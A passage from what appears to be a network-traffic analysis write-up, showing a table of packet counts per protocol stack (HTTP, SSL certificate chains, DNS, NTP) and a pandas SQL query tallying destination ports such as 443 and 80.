          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            10
          &lt;/th&gt;

          &lt;td&gt;
            870
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:data-text-lines
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            11
          &lt;/th&gt;

          &lt;td&gt;
            505
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:media
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            12
          &lt;/th&gt;

          &lt;td&gt;
            480
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:png
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            13
          &lt;/th&gt;

          &lt;td&gt;
            395
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:pkix1implicit:pkix1implicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1explicit:pkix1implicit:x509ce:pkix1implicit:x509ce:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:pkix1implicit:x509ce:x509ce:pkix1explicit:x509ce:x509ce:x509ce:pkcs-1:ssl
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            14
          &lt;/th&gt;

          &lt;td&gt;
            335
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:pkcs-1
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            15
          &lt;/th&gt;

          &lt;td&gt;
            320
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:image-gif
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            16
          &lt;/th&gt;

          &lt;td&gt;
            265
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:icmp:ip:udp:dns
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            17
          &lt;/th&gt;

          &lt;td&gt;
            205
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:data
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            18
          &lt;/th&gt;

          &lt;td&gt;
            165
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:data:data:xml
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            19
          &lt;/th&gt;

          &lt;td&gt;
            145
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:data:data:data-text-lines
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            20
          &lt;/th&gt;

          &lt;td&gt;
            130
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:data:data:json
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            21
          &lt;/th&gt;

          &lt;td&gt;
            95
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:json
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            22
          &lt;/th&gt;

          &lt;td&gt;
            85
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:x509ce:pkix1explicit:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:pkcs-1:ssl
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            23
          &lt;/th&gt;

          &lt;td&gt;
            85
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:x509ce:x509ce:pkix1implicit:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:pkix1implicit:x509ce:x509ce:pkix1explicit:pkix1implicit:x509ce:x509ce:logotypecertextn:x509ce:x509sat:x509ce:x509ce:pkcs-1:ssl
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            24
          &lt;/th&gt;

          &lt;td&gt;
            75
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:data:data:data:data:xml
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            25
          &lt;/th&gt;

          &lt;td&gt;
            65
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:data:data:data:data-text-lines
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            26
          &lt;/th&gt;

          &lt;td&gt;
            60
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:pkix1implicit:x509ce:x509ce:x509ce:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:pkcs-1:ssl
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            27
          &lt;/th&gt;

          &lt;td&gt;
            55
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:ns_cert_exts:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1explicit:x509ce:x509ce:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1explicit:x509ce:x509ce:x509sat:x509sat:x509sat:x509sat:x509ce:pkcs-1:ssl
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            28
          &lt;/th&gt;

          &lt;td&gt;
            55
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:x509ce:x509ce:pkix1implicit:logotypecertextn:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:pkix1explicit:x509ce:x509ce:ns_cert_exts:logotypecertextn:x509ce:x509sat:pkix1implicit:x509ce:pkcs-1:ssl
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            29
          &lt;/th&gt;

          &lt;td&gt;
            45
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:xml
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            30
          &lt;/th&gt;

          &lt;td&gt;
            40
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1implicit:x509ce:x509ce:x509ce:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:pkcs-1
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            31
          &lt;/th&gt;

          &lt;td&gt;
            35
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:xmpp:xml
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            32
          &lt;/th&gt;

          &lt;td&gt;
            30
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:data:data:data:image-gif
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            33
          &lt;/th&gt;

          &lt;td&gt;
            30
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:x509ce:x509ce:pkix1implicit:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:pkix1implicit:x509ce:x509ce:pkix1explicit:pkix1implicit:x509ce:x509ce:logotypecertextn:x509ce:x509sat:x509ce:x509ce:pkcs-1:ssl
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            34
          &lt;/th&gt;

          &lt;td&gt;
            25
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:x509ce:pkix1explicit:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:pkcs-1:ssl
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            35
          &lt;/th&gt;

          &lt;td&gt;
            20
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:pkix1implicit:pkix1implicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1explicit:pkix1implicit:x509ce:pkix1implicit:x509ce:x509ce:x509ce:pkcs-1:ssl
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            36
          &lt;/th&gt;

          &lt;td&gt;
            15
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:data:data:data:data:data-text-lines
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            37
          &lt;/th&gt;

          &lt;td&gt;
            15
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:ns_cert_exts:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1explicit:x509ce:x509ce:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1explicit:x509ce:x509ce:x509sat:x509sat:x509sat:x509sat:x509ce:pkcs-1:ssl
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            38
          &lt;/th&gt;

          &lt;td&gt;
            15
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:pkix1explicit:x509ce:x509ce:x509ce:x509ce:pkix1implicit:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:pkix1implicit:x509ce:x509ce:x509ce:x509ce:x509sat:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1explicit:x509ce:x509ce:x509ce:pkcs-1:ssl
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            39
          &lt;/th&gt;

          &lt;td&gt;
            15
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:x509ce:pkix1implicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:pkcs-1:ssl
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            40
          &lt;/th&gt;

          &lt;td&gt;
            15
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ulp
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            41
          &lt;/th&gt;

          &lt;td&gt;
            10
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:data:data:data:json
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            42
          &lt;/th&gt;

          &lt;td&gt;
            10
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:data:data:data:media
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            43
          &lt;/th&gt;

          &lt;td&gt;
            10
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:x509ce:pkix1implicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:pkcs-1:ssl
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            44
          &lt;/th&gt;

          &lt;td&gt;
            10
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:x509ce:pkix1explicit:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:pkcs-1:ssl
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            45
          &lt;/th&gt;

          &lt;td&gt;
            10
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:pkix1implicit:x509ce:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:pkix1implicit:x509ce:x509ce:pkix1explicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509sat:x509sat:x509sat:x509sat:x509sat:x509ce:pkix1implicit:x509ce:x509ce:pkix1explicit:x509ce:pkcs-1:ssl
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            46
          &lt;/th&gt;

          &lt;td&gt;
            10
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:pkix1implicit:pkix1implicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1explicit:pkix1implicit:x509ce:pkix1implicit:x509ce:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1implicit:x509ce:x509ce:x509ce:x509ce:x509ce:pkcs-1:ssl
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            47
          &lt;/th&gt;

          &lt;td&gt;
            10
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:pkix1implicit:pkix1implicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1explicit:pkix1implicit:x509ce:pkix1implicit:x509ce:x509ce:x509ce:pkcs-1:ssl
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            48
          &lt;/th&gt;

          &lt;td&gt;
            10
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:pkix1explicit:x509ce:x509ce:pkix1implicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:pkix1implicit:x509ce:x509ce:pkix1explicit:pkix1implicit:x509ce:x509ce:logotypecertextn:x509ce:x509sat:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:pkix1explicit:x509ce:logotypecertextn:pkix1implicit:x509ce:pkcs-1:ssl
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            49
          &lt;/th&gt;

          &lt;td&gt;
            10
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:udp:ntp
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            50
          &lt;/th&gt;

          &lt;td&gt;
            5
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:data:data:data:data:data:data:data-text-lines
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            51
          &lt;/th&gt;

          &lt;td&gt;
            5
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:data:data:data:data:data:data:data:data-text-lines
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            52
          &lt;/th&gt;

          &lt;td&gt;
            5
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data-text-lines
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            53
          &lt;/th&gt;

          &lt;td&gt;
            5
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:png
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            54
          &lt;/th&gt;

          &lt;td&gt;
            5
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:data:json
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            55
          &lt;/th&gt;

          &lt;td&gt;
            5
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:data:data:data:data:data:data:data:data:data:data:json
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            56
          &lt;/th&gt;

          &lt;td&gt;
            5
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:data:data:data:data:data:data:data:data:data:json
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            57
          &lt;/th&gt;

          &lt;td&gt;
            5
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:data:data:data:data:data:data:json
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            58
          &lt;/th&gt;

          &lt;td&gt;
            5
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:data:data:image-gif
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            59
          &lt;/th&gt;

          &lt;td&gt;
            5
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:data:data:png
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            60
          &lt;/th&gt;

          &lt;td&gt;
            5
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:json:data-text-lines
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            61
          &lt;/th&gt;

          &lt;td&gt;
            5
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:x509ce:pkix1explicit:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:pkcs-1:ssl
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            62
          &lt;/th&gt;

          &lt;td&gt;
            5
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:x509ce:pkix1explicit:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:pkcs-1
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            63
          &lt;/th&gt;

          &lt;td&gt;
            5
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:x509ce:x509ce:pkix1implicit:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:pkix1implicit:x509ce:x509ce:pkix1explicit:pkix1implicit:x509ce:x509ce:logotypecertextn:x509ce:x509sat:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:pkix1explicit:x509ce:x509ce:logotypecertextn:pkix1implicit:pkcs-1
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            64
          &lt;/th&gt;

          &lt;td&gt;
            5
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:pkix1implicit:pkix1implicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1explicit:pkix1implicit:x509ce:pkix1implicit:x509ce:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:pkix1implicit:x509ce:x509ce:pkix1explicit:x509ce:x509ce:x509ce:pkcs-1
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            65
          &lt;/th&gt;

          &lt;td&gt;
            5
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:pkix1explicit:pkix1implicit:pkix1implicit:x509ce:pkix1implicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:pkix1implicit:x509ce:x509ce:pkix1explicit:pkix1explicit:pkcs-1:ssl
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            66
          &lt;/th&gt;

          &lt;td&gt;
            5
          &lt;/td&gt;

          &lt;td&gt;
            sll:ipv6
          &lt;/td&gt;
        &lt;/tr&gt;
</code></pre>
</table>
</div>
<h3 id="used-destinations">Used destinations</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.sql" data-lang=".sql">p_ports<span style="color:#666"> </span>=<span style="color:#666"> </span>pdsql.<span style="color:#447fcf">read_frame</span>(<span style="color:#ed9d13">&#34;&#34;&#34;
</span><span style="color:#ed9d13">    SELECT COUNT(c.dstport), c.dstport
</span><span style="color:#ed9d13">    FROM connection AS c
</span><span style="color:#ed9d13">    JOIN dns AS d ON c.dst = d.dns_response
</span><span style="color:#ed9d13">    GROUP by c.dstport
</span><span style="color:#ed9d13">    ORDER by 1 DESC
</span><span style="color:#ed9d13">&#34;&#34;&#34;</span>,<span style="color:#666"> </span>con)<span style="color:#666">
</span><span style="color:#666"></span>p_ports.<span style="color:#447fcf">head</span>(<span style="color:#3677a9">100</span>)<span style="color:#666">
</span></code></pre></div><div class="table-responsive">
<table class="table">
                <tr align="left">
                  <th>
                    Â 
                  </th>
<pre><code>              &lt;th&gt;
                Packets
              &lt;/th&gt;

              &lt;th&gt;
                dstport
              &lt;/th&gt;
            &lt;/tr&gt;

            &lt;tr&gt;
              &lt;th&gt;0
              &lt;/th&gt;

              &lt;td&gt;
                18673312
              &lt;/td&gt;

              &lt;td&gt;
                443
              &lt;/td&gt;
            &lt;/tr&gt;

            &lt;tr&gt;
              &lt;th&gt;
                1
              &lt;/th&gt;

              &lt;td&gt;
                1879360
              &lt;/td&gt;

              &lt;td&gt;
                80
              &lt;/td&gt;
            &lt;/tr&gt;

